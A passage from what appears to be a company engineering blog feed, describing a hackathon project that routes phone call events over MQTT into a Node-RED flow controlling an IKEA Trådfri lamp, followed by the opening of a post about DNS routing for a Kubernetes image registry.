src="data:image/png;base64,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" width="1228" height="324" class="img_ev3q"></p><p>Clicking this button takes you to the login page:</p><div class="post-images halves" markdown="1">![](/img/blog/mqtt-event-bridge/login-enter-phonenumber.png) ![](/img/blog/mqtt-event-bridge/login-pin.png)</div><p>… and then asks you to allow our service to get your voice event and new voicemails. As I am only interested in the voice events here, I’ll only grant that.</p><p>As this is an experimental app which hasn’t been approved by anyone, our login page will give you a clear warning about trusting this.</p><div class="post-images single" markdown="1">![](/img/blog/mqtt-event-bridge/login-consent.png)</div><p>When that is done, it returns to our app showing this beautiful UI (still not a designer):</p><p><img loading="lazy" src="/jp/assets/images/success-f636e03c8edb08ab9b6418c1311e02ec.png" width="1141" height="371" class="img_ev3q"></p><p>The generated credentials will allow you to listen any topic matching <code>{phone number}/#</code>.</p><p>The following is the output from pasting that mosquitto_sub command in my terminal. It shows that I first called my Swedish number and hanging up before it was actually ringing.</p><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"event"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"sequence"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"1"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"ackInbox"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"_INBOX.VMTx7rnS0i3qXpHfuS5t3b"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"timestamp"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"2021-01-06T11:24:40Z"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"serviceId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"wotel"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"voiceEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"callId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"0c056e2c-07f9-4c2b-b5ca-042f160af42f"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"type"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"CALL_INITIATED"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"fromNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+4712345678"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"toNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"owner"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"event"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"metadata"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"sequence"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"2"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"ackInbox"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"_INBOX.VMTx7rnS0i3qXpHfuS5t3b"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"timestamp"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"2021-01-06T11:24:43Z"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"serviceId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"wotel"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"voiceEvent"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"callId"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"0c056e2c-07f9-4c2b-b5ca-042f160af42f"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"type"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"CALL_ENDED"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"fromNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+4712345678"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"toNumber"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"owner"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"e164"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"+46123456789"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If you run any home automation or other hobby projects at home, chances are that you already have a MQTT broker running.
You could then setup bridging to not worry about credentials and TLS when consuming your events.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="wrapping-it-all-up">Wrapping it all up<a class="hash-link" href="#wrapping-it-all-up" title="Direct link to heading">​</a></h2><p>For this project I chose to use Node-RED, as it allows for very quick and easy to show drag-and-drop integrations.</p><p>To control the lamp, we did add the module <code>node-red-contrib-tradfri</code> as described in the Node-RED <a href="https://flows.nodered.org/node/node-red-contrib-tradfri" target="_blank" rel="noopener noreferrer">documentation</a>.</p><p>First we did add a <code>mqtt out</code> node configured to listen to the topic 46123456789/# with output as a parsed JSON object using the credentials we got on login.</p><p><img loading="lazy" src="/jp/assets/images/nodered-debug-d8a10d5399f2a33887d3237d43e8e4bf.png" width="1146" height="718" class="img_ev3q"></p><p>We then simply hooked its output to a debug node. Looking at the output, we can see that the event object has a key <code>voiceEvent</code>, as this is a voice event.</p><p><img loading="lazy" src="/jp/assets/images/nodered-flow-958c30eb5b4cf4b283249d90f1f81122.png" width="1108" height="233" class="img_ev3q"></p><p>Then we added a switch for handling it as a voice event if the voiceEvent key exists. Likewise, we added a new switch on the type field of that event.</p><p>Each of those functions simply set the Trådfri payload, as shown below:</p><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token property">"state"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"on"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token property">"color"</span><span class="token operator" style="color:rgb(137, 221, 255)">:</span><span class="token string" style="color:rgb(195, 232, 141)">"cool daylight"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As this was created quickly as a hackathon project, the intention was never to actually make anything useful. Using this quick flow, it is however clear that it could be very useful for when my wife tries to call me, but I am programming equipped with my noise-cancelling headphones.</p>]]></content:encoded>
            <category>api</category>
            <category>grpc</category>
            <category>mqtt</category>
            <category>node-red</category>
        </item>
        <item>
            <title><![CDATA[Forbidden lore: hacking DNS routing for k8s]]></title>
            <link>https://www.wgtwo.com/jp/blog/forbidden-lore-hacking-dns-routing-for-k8s</link>
            <guid>forbidden-lore-hacking-dns-routing-for-k8s</guid>
            <pubDate>Fri, 11 Dec 2020 00:00:00 GMT</pubDate>
            <description><![CDATA[At WG2 we’re coming close to having everything running in Kubernetes, which means that almost everything we deploy needs to be pulled from a registry. We have run our own local registry for some time now, to host both locally-built images and cached images from Docker Hub.]]></description>
